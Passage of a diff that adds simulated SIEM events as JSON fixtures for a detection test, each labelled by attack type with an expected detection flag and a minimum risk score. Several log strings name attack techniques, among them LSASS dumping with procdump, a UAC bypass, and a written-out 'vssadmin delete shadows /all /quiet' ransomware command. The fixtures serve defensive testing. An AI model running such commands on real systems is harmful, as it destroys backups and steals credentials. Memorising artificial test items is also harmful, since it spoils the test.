+      "raw_log": "UAC bypass attempt via fodhelper.exe from 10.0.56.197",
+      "source_ip": "10.0.56.197",
+      "destination_ip": "",
+      "username": "user81",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 82
+  },
+  {
+    "id": "SIM-084",
+    "name": "Simulated Defense Evasion",
+    "task_type": "defense_evasion",
+    "siem_event": {
+      "raw_log": "AMSI bypass pattern detected in PowerShell from 10.0.190.116",
+      "source_ip": "10.0.190.116",
+      "destination_ip": "",
+      "username": "user67",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 54
+  },
+  {
+    "id": "SIM-085",
+    "name": "Simulated Persistence",
+    "task_type": "persistence",
+    "siem_event": {
+      "raw_log": "New service created: WindowsUpdateSvc pointing to C:\\temp\\payload.exe",
+      "source_ip": "10.0.244.211",
+      "destination_ip": "",
+      "username": "user6",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 81
+  },
+  {
+    "id": "SIM-086",
+    "name": "Simulated C2",
+    "task_type": "c2",
+    "siem_event": {
+      "raw_log": "Regular beacon detected from 10.0.170.42 to 192.168.1.100:4444 interval=60s",
+      "source_ip": "10.0.170.42",
+      "destination_ip": "10.0.50.166",
+      "username": "user37",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 81
+  },
+  {
+    "id": "SIM-087",
+    "name": "Simulated Data Exfil",
+    "task_type": "data_exfil",
+    "siem_event": {
+      "raw_log": "Large data transfer: 2GB uploaded to dropbox.com from 10.0.150.46",
+      "source_ip": "10.0.150.46",
+      "destination_ip": "",
+      "username": "user22",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 67
+  },
+  {
+    "id": "SIM-088",
+    "name": "Simulated Ransomware",
+    "task_type": "ransomware",
+    "siem_event": {
+      "raw_log": "vssadmin delete shadows /all /quiet executed on 10.0.72.157",
+      "source_ip": "10.0.72.157",
+      "destination_ip": "",
+      "username": "user77",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 66
+  },
+  {
+    "id": "SIM-089",
+    "name": "Simulated Credential Access",
+    "task_type": "credential_access",
+    "siem_event": {
+      "raw_log": "LSASS memory access from 10.0.222.2 using procdump.exe",
+      "source_ip": "10.0.222.2",
+      "destination_ip": "",
+      "username": "user60",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "SIM-090",
+    "name": "Simulated Discovery",
+    "task_type": "discovery",
+    "siem_event": {
+      "raw_log": "Suspicious activity detected from 10.0.219.135",
+      "source_ip": "10.0.219.135",
+      "destination_ip": "",
+      "username": "user18",
+      "severity": "medium"
+    },
+    "expected_detection": true,
+    "min_risk": 57
+  },
+  {
+    "id": "SIM-091",
+    "name": "Simulated Brute Force",
+    "task_type": "brute_force",
+    "siem_event": {
+      "raw_log": "Failed login attempts from 10.0.174.80 - 500 attempts in 60 seconds",
+      "source_ip": "10.0.174.80",
+      "destination_ip": "",
+      "username": "user3",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 84
+  },
+  {
+    "id": "SIM-092",
+    "name": "Simulated Lateral Movement",
+    "task_type": "lateral_movement",
+    "siem_event": {
+      "raw_log": "PsExec execution from 10.0.58.16 to 10.0.251.99 with admin credentials",
+      "source_ip": "10.0.58.16",
+      "destination_ip": "10.0.251.99",
+      "username": "user48",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 55
+  },
+  {
+    "id": "SIM-093",
+    "name": "Simulated Privilege Escalation",
+    "task_type": "privilege_escalation",
+    "siem_event": {
+      "raw_log": "UAC bypass attempt via fodhelper.exe from 10.0.158.192",
+      "source_ip": "10.0.158.192",
+      "destination_ip": "",
+      "username": "user78",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 67
+  },
+  {
+    "id": "SIM-094",
+    "name": "Simulated Defense Evasion",
+    "task_type": "defense_evasion",
+    "siem_event": {
+      "raw_log": "AMSI bypass pattern detected in PowerShell from 10.0.242.106",
+      "source_ip": "10.0.242.106",
+      "destination_ip": "",
+      "username": "user83",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 71
+  },
+  {
+    "id": "SIM-095",
+    "name": "Simulated Persistence",
+    "task_type": "persistence",
+    "siem_event": {
+      "raw_log": "New service created: WindowsUpdateSvc pointing to C:\\temp\\payload.exe",
+      "source_ip": "10.0.129.5",
+      "destination_ip": "",
+      "username": "user1",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 74
+  },
+  {
+    "id": "SIM-096",
+    "name": "Simulated C2",
+    "task_type": "c2",
+    "siem_event": {
+      "raw_log": "Regular beacon detected from 10.0.160.172 to 192.168.1.100:4444 interval=60s",
+      "source_ip": "10.0.160.172",
+      "destination_ip": "10.0.51.210",
+      "username": "user39",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 61
+  },
+  {
+    "id": "SIM-097",
+    "name": "Simulated Data Exfil",
+    "task_type": "data_exfil",
+    "siem_event": {
+      "raw_log": "Large data transfer: 2GB uploaded to dropbox.com from 10.0.22.159",
+      "source_ip": "10.0.22.159",
+      "destination_ip": "",
+      "username": "user5",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 71
+  },
+  {
+    "id": "SIM-098",
+    "name": "Simulated Ransomware",
+    "task_type": "ransomware",
+    "siem_event": {
+      "raw_log": "vssadmin delete shadows /all /quiet executed on 10.0.154.181",
+      "source_ip": "10.0.154.181",
+      "destination_ip": "",
+      "username": "user71",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 51
+  },
+  {
+    "id": "SIM-099",
+    "name": "Simulated Credential Access",
+    "task_type": "credential_access",
+    "siem_event": {
+      "raw_log": "LSASS memory access from 10.0.119.167 using procdump.exe",
+      "source_ip": "10.0.119.167",
+      "destination_ip": "",
+      "username": "user82",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 51
+  },
+  {
+    "id": "SIM-100",
+    "name": "Simulated Discovery",
+    "task_type": "discovery",
+    "siem_event": {
+      "raw_log": "Suspicious activity detected from 10.0.56.193",
+      "source_ip": "10.0.56.193",
+      "destination_ip": "",
+      "username": "user73",
+      "severity": "medium"
+    },
+    "expected_detection": true,
+    "min_risk": 79
+  }
+]
